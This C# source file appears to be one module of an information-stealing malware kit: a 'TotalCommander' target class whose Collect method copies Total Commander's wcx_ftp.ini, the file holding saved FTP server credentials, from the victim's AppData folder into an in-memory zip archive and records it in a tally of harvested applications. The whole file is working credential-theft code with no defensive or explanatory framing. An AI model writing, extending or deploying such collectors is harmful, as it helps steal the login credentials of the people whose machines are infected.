using Helper.Data;
using System;
using System.IO;

namespace Targets.Applications
{
	public class TotalCommander : ITarget
	{
	  public void Collect(InMemoryZip zip, Counter counter)
	  {
	    string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "GHISLER", "wcx_ftp.ini");
	    if (!File.Exists(path))
	      return;
	    string entryPath = "Total Commander\\wcx_ftp.ini";
	    zip.AddFile(entryPath, File.ReadAllBytes(path));
	    counter.Applications.Add(new Counter.CounterApplications()
	    {
	      Name = "Total Commander",
	      Files = {
	        $"{path} => {entryPath}",
	        entryPath
	      }
	    });
	  }
	}
}
